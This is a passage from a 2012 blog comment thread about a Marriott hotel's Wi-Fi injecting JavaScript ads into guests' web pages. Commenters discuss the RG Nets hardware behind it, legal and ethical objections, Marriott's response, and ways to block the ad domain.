OUI assigned to them.\n\nCheck this out:\n\nhttp://www2.ntia.doc.gov/files/grantees/floridaruralbroadbandalliance_infrastructure_application_attachments_part4.pdf\n\n$10k a pop from what I read. At that price, can\u2019t be that many of these things\nout there.\n\njustin\n\nApr 6, 2012 10:40pm\n\nAnon, impressive sleuthing. I\u2019m no longer at the hotel, but I\u2019ll probably be\nback in a month or so, so I\u2019ll be able to check back in.\n\nMike\n\nApr 7, 2012 5:59am\n\nJustin, if they are doing this and you find it offensive, why go back to them\nand give them more business? If people didn\u2019t stay there when this happened,\nthe practice would stop.\n\nJohn B\n\nApr 7, 2012 8:14am\n\nThis is very disturbing. Injecting ads is bad enough, but hijacking the\ncontent could be used for a lot worse activity.\n\njustin\n\nApr 7, 2012 9:10am\n\nMike, though I\u2019m a strong proponent of voting with my feet, as you recommend,\nthere are some situations that are simply wrong, and can only be addressed by\nbringing attention to the issue, as I have done.\n\nFadi\n\nApr 7, 2012 9:22am\n\nI don\u2019t think the Marriott is aware of this \u2013 I\u2019m not sure they really need\nthe few dollars here and there that they will gain from people clicking on\ntheir links. Have you reported the problem to the staff at Marriott? This is a\nmajor security issue in my opinion \u2013 I don\u2019t think they\u2019re only using it to\ninject ads, but they are also gathering browsing information as well.\n\nChris\n\nApr 7, 2012 10:59am\n\nBe thankful the internet is freely accessible where you are as it is.\n\nhttp://upload.wikimedia.org/wikipedia/en/1/19/Du_block_page_v2.png\n\n-From Dubai\n\nCitizenWill\n\nApr 7, 2012 2:54pm\n\nNice catch Justin. Wonder if the NYTimes link love will lead to an increase in\ncontainer ship travel?\n\nDaveK\n\nApr 7, 2012 3:47pm\n\nThis violates the Berne Convention Author\u2019s Moral right to preserve the\nintegrity of their work. And Marriott Hotels have deep pockets. Some content\ncreator should get a lawyer and sue them and RG nets bigtime.\n\nRyan Michael\n\nApr 7, 2012 7:02pm\n\nSubversion? Really?!? git with the program, bro\n\njojo\n\nApr 8, 2012 11:53pm\n\nCheck out what Marriott in Philly is tracking, your tv viewing thru this\ncompany TIVUS. check out their website it states that the hotel will profit\nfrom defined advertising from info received from tracking your viewing habits.\nKinda creepy to me.\n\nRichardH\n\nApr 9, 2012 4:02am\n\nHaving discovered this, could one not simply set one\u2019s host file to redirect\nadsmws.cloudapp.net to 127.0.0.1 thereby disabling it permanently? I\u2019m talking\nabout a Windows device but I assume there are equivalent *nix/Mac options.\n\nRichardH\n\nApr 9, 2012 4:10am\n\nok \u2013 thinking a bit more about that obviously they could do more nasty\nrewriting if they were very clever (probably aren\u2019t) like rewriting every URL\nto include a proxy so they could randomly replace images on the fly with ads\nof their choosing based on the image\u2019s dimensions (neat huh); but they aren\u2019t\ndoing that \u2013 so presuming they are writing in sources that come from 1 domain,\nor a small number, it might be worth checking each time you power up in a new\nhotel and blocking these things out...\n\nIt\u2019s ugly, but it will work. And you can\u2019t really get upset at the hotel for\ntrying to make a buck or provide cheap/free internet to its customers.\n\njason\n\nApr 9, 2012 7:17am\n\nCount yourself lucky. In many places in Europe you pay that much for a hotel\nroom and then they actually have the nerve to charge you *extra* for WiFi\naccess, and then give you a connection barely better than using 3G!\n\njustin\n\nApr 9, 2012 9:33am\n\nWill, who knows. In terms of traffic driven to my post, Hacker News sends\nseveral orders of magnitude more visitors than the NY Times\u2014though the NY\nTimes readers might be more likely to ride container ships.\n\nRichardH, yes, you could update your hosts file to prevent the external\nJavaScript from loading, but keep in mind\u2014they\u2019ve already modified the HTML\nyou\u2019ve requested at this point, which you cannot prevent with a hosts file\nentry.\n\nTo Chris, Jason, and anyone else with the defeatist attitude of: \u201cconsider\nyourself lucky, the internet is much worse in X\u201d. NO. I will not consider\nmyself lucky. I will fight for my right to have the content I request to be\nunadulterated by internet access providers. Instead, count yourself lucky that\nI\u2019m willing to take a stand and publicize a small injustice before it becomes\na large one. Perhaps it will one day rub off on your countries.\n\nCitizenWill\n\nApr 9, 2012 11:17am\n\nI count myself lucky....\n\nFunny reaction maybe due to it only involving injection of ads into content.\nImagine though replacing content Mariott doesn\u2019t like with something they do \u2013\nsay content from the BedBugRegistry. Or what about news content the\ncorporation doesn\u2019t want you to see \u2013 rather than censor it wholesale they\ninject their own FoxNews spin.\n\nThis happens more than is reported. The example I use is local BestBuy\u2019s. Some\nof them proxy out competitors. One actually replaced links from a competitors\nproduct page to BestBuy\u2019s online store (I brought this to the managers\nattention and haven\u2019t caught them doing this since).\n\nJust another layer on top of what ISPs, etc. are doing to adulterate content.\n\nSnowman\n\nApr 9, 2012 11:29am\n\nThanks \u2013 I just added their web site to my host file blocked list.\n\nTS\n\nApr 9, 2012 1:39pm\n\nThe only correct description of such hidden content changing practices is\n\u2018vandalism\u2019 \u2013 it basically always spoils the service and sometimes even breaks\nit. Even worse, both providers/producers as well as consumers are not aware of\nit being in effect and consider any issues resulting out of it as a flaw on\nthe other part or the general underlying constructs rather on the real\nculprit.\n\nA similar yet widespread technology gone wrong is named ByteMobile (similar\ntechnologies exist under other names as well) which \u201coptimizes\u201d speed by\nrewriting web pages and messing up images by recompressing them. Many mobile\nnetwork providers use it by default while spreading basically zero information\nabout it, thus basically cheating on their clients by selling them a degraded\nservice as \u201cfull internet access\u201d.\n\nOpera Turbo is similar, however it is displayed to the users whether it is\napplied or not, thus allowing them to opt in or out as desired.\n\nKen S\n\nApr 9, 2012 3:05pm\n\nJust got the following via DM from @marriottintl on Twitter:\n\n(Part 1) Mr. Snider, thx for your DM. We exchanged emails w/ Mr. Watt last\nweek & today. As far as the hotel is concerned, as soon as we... (Part 2)\nlearned of the situation, we launched an investigation into the matter. Prelim\nfindings revealed that, unbeknownst to the hotel... (Part 3) the ISP company\nwas utilizing functionality that allowed advertising to be pushed to the end\nuser. The ISP has assured the hotel... (Part 4) this functionality has now\nbeen disabled. While this is a common marketing practice with many Internet\nservice providers, Marriott (Part 5) does not condone this practice. At no\ntime was data security ever at risk. Mr. Snider, we appreciate you taking the\ntime time to (Part 6) reach out to us. It is feedback from our valuable\ncustomers that allow us to improve our service. Have a good week & we hope\nto... (Part 7) see you soon!\n\nAndrew Paterson\n\nApr 9, 2012 3:23pm\n\nJust because a hotel is offering \u2018free\u2019 internet access doesn\u2019t mean they can\nhack into content you are viewing. If this is happening a declaration should\nbe made, and give you an option for free hacked pages, or paid for internet\nwith no modifications. This is a serious breach of trust.\n\nEric\n\nApr 9, 2012 8:16pm\n\nI\u2019m curious as to why the extra lines were not in the pages when you fetched\nthem with wget. As far as the router is concerned, isn\u2019t wget requesting the\nweb page just the same as any other browser?\n\njustin\n\nApr 9, 2012 8:59pm\n\nEric, when I described using wget to download my homepage, I was sshed into my\nwebhost in Los Angeles, so I was effectively downloading it from an external\nhost, not from within the hotel\u2019s wifi network, if that makes any sense. Which\nis why it didn\u2019t contain the injected JavaScript. However when I used wget on\nthe command line locally at the hotel, the source of my homepage did contain\nthe injected JavaScript, just as you described\u2014no different than what the web\nbrowser \u201csaw\u201d. Sorry if that wasn\u2019t clear in my post.\n\nMychal M.\n\nApr 10, 2012 6:20am\n\nThank you...I will be on the lookout now.\n\nanon\n\nApr 10, 2012 5:37pm\n\n> What bugs me about their response is that the device required to do this\n> type of on-the-fly JavaScript injection of HTML is both rare and expensive.\n> It requires specialized hardware (like the RG Nets\u2019 RXG-A8) starting at a\n> cost of $10,000. In other words, this hardware was procured precisely for\n> the purpose of perpetrating this kind of attack. If Courtyard/Marriott/Hotel\n> Internet Services didn\u2019t want that feature, then they probably could have\n> requisitioned cheaper, less specialized, and more robust networking\n> hardware.\n\nHey Justin, the rgnets device is not specialized to doing the JS injection. It\ndoes a lot of stuff more stuff, most of this is outlined in the stuff I dug\nup. Look at that Florida RFP that shows the $10k price and even on their\nwebsite.\n\nI am betting that the rgnets machine is the router for the network and is\ndelivering the portal, doing the bandwidth mgmt, etc. If that machine is the\nmain router for the guest network, ripping it out is obviously not an option\nwithout putting something else in. Look at their network diagrams and stuff.\nThat\u2019s what I was asking about the MAC address. I want to get some more\nevidence about how this stuff works.\n\nAnyway, my point is that I don\u2019t think that the Marriott or the Marriott\u2019s ISP\nbought this device for the purpose of doing this kind of a thing. I think that\nthe Marriott or the Marriott\u2019s ISP bought this device because it is designed\nto do everything they might ever possibly need for the guest WiFi and that it\nis probably the core router.\n\nSo do get that MAC address and we can try some snooping to see how DHCP works\non that network, like who the server, etc... once we get that I think we can\nbetter figure out what is going on.\n\njustin\n\nApr 10, 2012 9:40pm\n\nHey anon, have you seen the RG Nets website, you know, the one with the stock\nphoto of the hand dropping coins, and the tagline: \u201cGot network? Want money?\nGet rXg.\u201d And the links about \u201cdeploy[ing] a profitable revenue generating\nnetwork!\u201d\n\nYou\u2019re being surprisingly conservative, but I feel pretty confident in my\nassertion that the RXG device was purchased and put in place specifically for\nthis type of malicious ad injection activity. If it also happens to act as a\nrouter and bandwidth manager, great\u2014but there are other devices that do that\nwithout the evil. You don\u2019t buy an RG Nets RXG thinking, \u201cHey this will be a\ngreat core router for my client\u2019s hotel.\u201d You buy it with dollars signs in\nyour eyes.\n\nAnyway, I\u2019m no longer at the hotel, so I can\u2019t poke around. I\u2019ll definitely be\ncurious to update this post depending on what I see the next time I travel to\nNYC.\n\nanon\n\nApr 12, 2012 4:03pm\n\nSorry for the miscommunication. I\u2019m not trying to be conservative in the\nassessment of what they are doing at all. Certainly they [ Marriot, Hotel\nInternet ISP, whatever ] have bought this equipment because of the dollar\nsigns. What I believe is happening though, is that the advertising is only a\nsecondary or tertiary thing that they are doing. Look at all the things that\nthey are talking about on the rgnets website. They are talking about profiling\npeople, selling bandwidth and quota upgrades and all sorts of stuff like that.\n\nAnyway advertising seems like it\u2019s an added extra in their literature. You\nseem to think that this is the main reason why this machine exists or is\ndeployed. It\u2019d be interesting to see which way this really is. Figuring out\nthe network topology I think will shed some light on it. Look forward to\nworking with on mapping out the network at that hotel next time you get there.\n\ndk\n\nApr 13, 2012 7:38am\n\n@Eric. Perhaps the injection also detect the User-Agent value (it is very\npossible, because each browser handle JS differently)\n\nSo this give me an idea. What if we modify the User-Agent? But the down side\nis some website also use that to determine what javascript to run... :(\n\nSSL Proxy, here I come... ;)\n\nRobert Simpson\n\nApr 13, 2012 8:49am\n\nThe copyright statement on the HTML Blog specifically prohibits alteration of\nthe user experience. So if anything like that is going on, it\u2019s in violation\nof our copyright. Class action, anyone?\n\njustin\n\nApr 13, 2012 9:28am\n\nAnon, no worries, I just wanted to make clear that this type of JavaScript\ninjection wasn\u2019t just a tertiary feature of the device.\n\ndk, as I replied to Eric, he misunderstood my description of wget in my post.\nWhen I used wget on my local machine at the hotel, the JavaScript was\ninjected, and I did save copies of my index.html file and several others that\nI downloaded using wget as evidence. However, the use of wget I was describing\nin my post was after I\u2019d sshed into my webhost\u2019s server in Los Angeles, and it\nwas there that wgeting my homepage did not show the JavaScript injection. I\u2019ve\njust updated the text of my post to make that more clear.\n\nHowever, to your point, I didn\u2019t think to play with the Firefox User Agent\nSwitcher add-on to see if the injection differed depending on what browser I\nwas advertising myself as.\n\nRobert, I\u2019ve informed the ACLU and EFF of my discoveries, but I\u2019ve yet to hear\nback.\n\nrjdaggett\n\nApr 24, 2012 12:49am\n\nI am at a marriott now. I have a comcast ext. IP in marlton,NJ. I am in\nlanghorne,PA. The ISP is active networks and the gateway is a nomadix ag 3000,\nthat is a legacy product. I\u2019ll walk next door to the courtyard tomorrow and\nscan them too\n\nCJ\n\nMay 9, 2012 1:32pm\n\nWhat ISP was this injection on? Also knowing Marriott, the 800lb gorilla that\nforces it\u2019s policies on every vendor, this is something they asked for and may\nhave been testing to deploy.\n\nAlso, every solution and piece of equipment on their network has to go through\ntheir lab test and be certified for use.\n\ntablet pc\n\nJun 22, 2012 8:17pm\n\nUse Windows Update to check whether you need the service pack and to install\nit. Click the Start button, click All Programs, click Windows Update, and then\nclick Check for updates.\n\ngaius gracchus\n\nJul 5, 2012 3:00pm\n\nIt is happening here, too, at Carson Valley Inn in Minden, NV. Screws up my\nbrowser sessions while it hangs trying to transfer data from\nhttp://adsmws.cloudapp.net. I may just have to turn javascript off on my\nbrowser. GaiusGracchus\n\ngaius gracchus\n\nJul 7, 2012 1:48pm\n\nActually, the better solution is to block the site in your browser. Chrome\nwill allow you to block certain sites from using JavaScript. Select the\ntoolbar (wrench in the top right-most corner of browser window), then choose\n\u2018Settings\u2019. Then choose \u2018Show Advanced Settings...\u2019, then under Privacy, pick\n\u2018Content Settings...\u2019. Then under JavaScript pick \u2018Manage exceptions...\u2019 Add a\nnew hostname pattern: http://adsmws.cloudapp.net Select \u2018Block\u2019 in the\ndropdown. Click \u2018OK\u2019 and you are DONE! No more interference from this stupid\nHOTEL WIFI Javascipt virus-like INJECTION!!!!\n\nStefania\n\nFeb 22, 2013 3:33pm\n\nHello Justin, good job bro.... You gave me one more reason to tunnel over an\nencrypted IPv6 VPN all my traffic when connected to WI-FI. Since the vast\nmajority of WI-FI admin tools (Nomadix etc...) are easily hackable/crackable\nthe only way is to create a tunnel (if UDP is not voluntarily blocked by ISPs\nor professionals involved) to your trusted VPN provider.... I\u2019ve been surfing\nin total freedom even in Cuba (where DNS are strictly controlled and many\nresources are unavailable through them).\n\nThanks a lot for your inputs\n\nStefy\n\ncurranimal\n\nApr 10, 2013 9:57pm\n\nI\u2019ve been staying at the Marriott Residence Inn in Bloomington MN for the last\nweek. The \u2018Free High Speed\u2019 internet is slow as smoke off of dog shit. Firefox\nalerted me to the adsmws js crapola... Marriott obviously is complicit! Some\ncreative surfing pointed me to your blog. The hotel IT guy blamed the slow\nperformance on my machine being loaded up with malware (duh, not the case). I\nwould love to see the look on his face when opened my email with a link to\nyour blog. Busted!! Bottom line is that Marriott loses customer loyalty when\ntheir \u2018free internet\u2019 is useless. My Advise to Marriott customers is to use\nthe opt-out,\n\nKC\n\nMay 17, 2013 2:38pm\n\nThanks for this blog. I am on support staff for a cloud-based software; we\nspent an hour w/ a user because this injection was interfering w/ the\njavascript on the login screen to our software. Everyone blamed our software\nuntil we noticed the injection scripts on other pages from his connection.\nTurns out he is staying at a hotel and that\u2019s the real problem.\n\nguest\n\nMay 31, 2013 4:41pm\n\nI am also currently in a Marriot-owned hotel and was having trouble with my\ninternet and noticed something appearing when I tried to go back on a page.\nThis was the first thing that came up on Google when I just searched the name\nof the page...and then I find Marriot has been doing this for a while.\n\nanon\n\nOct 21, 2013 5:22pm\n\nif it\u2019s disclosed in the ToS of the free wifi, I\u2019m ok with it (ie: i can\nchoose to pay for a level of service without it, or use my own evdo\nconnection, or mifi and pay carrier data rates with Verizon). some folks want\nfree wifi but the truth is there are still costs on the system so as long as\nit (the ad. injection) not part of a paid system or is disclosed on a free one\n(ie: it has to be supported somehow), that\u2019s the key.\n\ni\u2019m not sure i buy the copyright infringement, but i don\u2019t like it breaking\ncloud code or youtube \u2013 if it increases tech support load for anyone it needs\nto be refined or pulled, period.\n\n\u00a9 2002 Justin Watt \u00b7 License: CC BY 4.0 Int\u2019l\n\nAbout Justinsomnia\n\n", "frontpage": false}
